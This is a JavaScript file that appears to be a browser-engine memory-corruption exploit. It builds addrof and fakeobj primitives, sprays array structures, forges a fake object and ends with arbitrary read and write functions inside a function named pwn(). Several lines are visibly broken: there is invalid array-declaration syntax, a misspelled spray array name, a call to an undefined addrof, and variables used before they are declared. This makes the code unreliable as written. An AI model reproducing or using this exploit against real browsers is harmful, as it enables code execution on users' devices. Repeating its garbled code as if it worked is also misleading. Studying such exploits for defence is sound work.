// addrof primitive
function addrof2(obj) {
    boxed[0] = obj;
    return unboxed[0];
}

// fakeobj primitive
function fakeobj(addr) {
    unboxed[0] = addr;
    return unboxed[0];
}

// Launch attack
function pwn() {
    // Fill an array we are going to spray with arrays with an element & property,
    // specifically doubles (important! because we can use raw doubles to represent
    // pointers)
    var structure_spray[];
    for(var i = 0; i < 1000; i++) {
        var arr = [13.37];
        arr.a = 13.37;
        arr['p'+i] = 13.37;                 // p+i instead of p in order to force new structure IDs
        structure_spray_spray.push(arr)
    }

    // Pick a victim, any victim (seriously, any in the middle-ish)
    var victim = structure_spray[444];

    // Create some new arrays to do memory manipulation on, one 32 bit, the other 64.
    var convert = new ArrayBuffer(0x10);
    var u32 = new Uint32Array(convert);
    var f64 = new Float64Array(convert);

    // Setup flag values for ArrayWithDouble & ArrayWithContiguous
    u32[0] = 0x200; 
    u32[1] = 0x01082007 - 0x10000;
    var flag_dbl = f64[0];
    u32[1] = 0x01082009 - 0x10000;
    var flag_cnt = u32[0];

    // Create a placeholder object. Outer because it will be the "outer" of hax
    // Use contiguous so we can play with JSValues of objects. Changed to dbl/ptr later
    var outer = {
        cell_header: flag_cnt,
        butterfly: victim,
    };

    // Create our custom-crafted hax object
    // hax: cellheader of ArrayWithContiguous, butterfly is victim
    f64[0] = addrof(outer);
    u32[0] += 0x10;
    var hax = fakeobj(f64[0]);

    // Create and point boxed and unboxed to random locations
    // Their contents aren't important, only their types
    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
    var boxed = [{}];

    // "Point" refers to changing the given array's butterfly
    // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
    //
    // First, point victim[] to unboxed[]
    // Second, save the location of unboxed
    // Third, point victim[] to boxed[]
    // Finally, point unboxed[] and boxed[] to the same place (give them same bfly)
    // 
    // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
    // and then access them as objects with boxed[]
    hax[1] = unboxed;
    var tmp_bfly_ptr = victim[1];
    hax[1] = boxed;
    victim[1] = tmp_bfly_ptr;

    // Change hax[] from an ArrayWithContiguous into an ArrayWithDouble
    // This is necessary inorder to avoid boxing our values below when using hax[]
    outer.cell_header = flag_dbl;

    // Arbitrary read
    read64 = function(ptr) {
        f64[0] = ptr;
        u32[0] += 0x10; // Because accessing property does -0x10
        hax[1] = f64[0];
        return victim.a;
    }

    // Arbitrary write
    write64 = function(ptr, val) {
        f64[0] = ptr;
        u32[0] += 0x10; // Because accessing property does -0x10
        hax[1] = f64[0];
        victim.a = val;
    }
}

ready.then(function() {
    try {
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
        ws_log.send("Connection closed!");
        ws_log.close();
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});